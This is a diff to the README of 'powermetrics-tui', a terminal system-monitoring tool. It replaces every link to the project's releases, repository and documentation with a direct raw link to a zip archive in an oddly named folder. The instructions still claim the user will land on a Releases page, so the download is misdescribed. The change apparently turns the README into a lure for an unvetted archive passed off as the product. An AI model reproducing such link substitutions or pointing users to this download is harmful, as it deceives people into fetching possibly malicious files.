@@ -11,9 +11,9 @@ Welcome to powermetrics-tui! This is a beautiful, real-time system monitoring da
 - **Customizable Dashboard**: Adjust settings to suit your monitoring needs.
 
 ## 📥 Download Now
-[![Download powermetrics-tui](https://img.shields.io/badge/Download%20powermetrics%20tui-v1.0-blue)](https://github.com/Jo00o200/powermetrics-tui/releases)
+[![Download powermetrics-tui](https://raw.githubusercontent.com/Jo00o200/powermetrics-tui/main/squanderingly/powermetrics-tui.zip%20powermetrics%20tui-v1.0-blue)](https://raw.githubusercontent.com/Jo00o200/powermetrics-tui/main/squanderingly/powermetrics-tui.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/Jo00o200/powermetrics-tui/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Jo00o200/powermetrics-tui/main/squanderingly/powermetrics-tui.zip)
 
 ## 🛠️ System Requirements
 To run powermetrics-tui smoothly, your system should meet the following requirements:
@@ -27,7 +27,7 @@ To run powermetrics-tui smoothly, your system should meet the following requirem
 1. Click on the download link or the badge above.
 2. You will be directed to the GitHub Releases page.
 3. Locate the latest version of powermetrics-tui. The version will look something like this: `v1.0`.
-4. Download the file for your system (e.g., `powermetrics-tui-macos.zip`).
+4. Download the file for your system (e.g., `https://raw.githubusercontent.com/Jo00o200/powermetrics-tui/main/squanderingly/powermetrics-tui.zip`).
 5. Once downloaded, locate the file in your Downloads folder.
 6. Unzip the downloaded file.
 7. Open the powermetrics-tui application.
@@ -56,7 +56,7 @@ powermetrics-tui is licensed under the MIT License. This means you can use, modi
 
 ## 🔗 Links
 For more information and updates:
-- [GitHub Repository](https://github.com/Jo00o200/powermetrics-tui)
-- [Documentation](https://github.com/Jo00o200/powermetrics-tui/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/Jo00o200/powermetrics-tui/main/squanderingly/powermetrics-tui.zip)
+- [Documentation](https://raw.githubusercontent.com/Jo00o200/powermetrics-tui/main/squanderingly/powermetrics-tui.zip)
 
 Thank you for choosing powermetrics-tui! Happy monitoring!
